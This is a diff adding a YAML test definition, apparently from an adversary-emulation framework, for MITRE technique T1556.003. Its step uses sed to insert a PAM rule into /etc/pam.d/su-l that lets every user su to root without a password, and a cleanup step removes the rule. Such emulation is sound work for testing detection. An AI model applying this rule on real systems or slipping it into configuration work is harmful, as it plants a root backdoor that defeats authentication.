@@ -1,0 +1,38 @@
+api_version: "2.0"
+name: Malicious PAM rule
+description: |
+    Inserts a rule into a PAM config and then tests it.
+
+    Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
+args:
+    - name: index
+      type: integer
+      default: "1"
+    - name: path_to_pam_conf
+      type: string
+      default: /etc/pam.d/su-l
+    - name: pam_rule
+      type: string
+      default: auth sufficient pam_succeed_if.so uid >= 0
+uuid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+        - 'TA0005: Defense Evasion'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1556: Modify Authentication Process'
+    subtechniques:
+        - 'T1556.003: Pluggable Authentication Modules'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: malicious-pam-rule
+      inline: |
+        sudo sed -i "{{.Args.index}}s,^,{{.Args.pam_rule}}\n,g" {{.Args.path_to_pam_conf}}
+      executor: sh
+      cleanup:
+        inline: |
+            sudo sed -i "\,{{.Args.pam_rule}},d" {{.Args.path_to_pam_conf}}
+        executor: sh
